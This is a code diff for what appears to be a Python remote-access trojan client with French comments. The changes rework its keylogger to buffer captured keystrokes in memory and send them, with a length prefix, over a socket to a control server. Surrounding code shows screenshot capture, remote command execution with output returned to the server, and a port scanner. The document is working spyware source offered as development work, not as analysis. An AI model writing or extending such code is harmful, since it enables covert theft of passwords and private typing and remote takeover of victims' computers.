@@ -7,35 +7,32 @@ import io
 
 ip_address = '127.0.0.1'
 port_number = 1234
-keylog_file = "keylog.txt"
+keylog_data = ""  # Variable pour stocker les frappes clavier en mémoire
+
 
 def start_keylogger():
+    global keylog_data
+
     def on_press(key):
+        """
+        Capture les frappes clavier et les stocke dans la variable globale `keylog_data`.
+        """
         try:
-            with open(keylog_file, "a") as f:
-                if hasattr(key, 'char') and key.char is not None:
-                    f.write(key.char)
-                else:
-                    if key == keyboard.Key.space:
-                        f.write(" ")
-                    elif key == keyboard.Key.enter:
-                        f.write("\n")
-                    elif key == keyboard.Key.backspace:
-                        f.seek(0, 2)
-                        size = f.tell()
-                        if size > 0:
-                            f.seek(0, 0)
-                            data = f.read(size - 1)
-                            f.truncate(0)
-                            f.write(data)
-                    elif key == keyboard.Key.tab:
-                        f.write("\t")
-                    else:
-                        pass
+            if hasattr(key, 'char') and key.char is not None:
+                keylog_data += key.char
+            else:
+                if key == keyboard.Key.space:
+                    keylog_data += " "
+                elif key == keyboard.Key.enter:
+                    keylog_data += "\n"
+                elif key == keyboard.Key.tab:
+                    keylog_data += "\t"
         except Exception as e:
             pass
+
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
+
 
 def connect_to_server():
     cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -51,12 +48,12 @@ def connect_to_server():
                 break
 
             elif command.lower() == 'keylog':
-                try:
-                    with open(keylog_file, "r") as f:
-                        keylog_content = f.read()
-                    cs.send(keylog_content.encode())
-                except FileNotFoundError:
-                    cs.send(b"Keylog file not found.")
+                global keylog_data
+                # Envoi des données du keylogger au serveur
+                keylog_content = keylog_data.encode()  # Convertir en binaire
+                cs.send(str(len(keylog_content)).encode())  # Envoi de la taille
+                cs.recv(1024)  # Attendre l'accusé de réception
+                cs.sendall(keylog_content)  # Envoi des frappes
 
             elif command.lower() == 'screenshot':
                 screenshot = pyautogui.screenshot()
@@ -86,7 +83,7 @@ def connect_to_server():
 
                 output = result.stdout + result.stderr
                 if not output:
-                    output = "Commande executée, pas de sortie !."
+                    output = "Commande exécutée, pas de sortie !."
 
                 cs.send(output.encode())
 
@@ -97,6 +94,7 @@ def connect_to_server():
             break
 
     cs.close()
+
 
 def scan_ports(start_port, end_port):
     open_ports = []
@@ -111,6 +109,7 @@ def scan_ports(start_port, end_port):
         except Exception as e:
             pass
     return open_ports
+
 
 if __name__ == "__main__":
     connect_to_server()
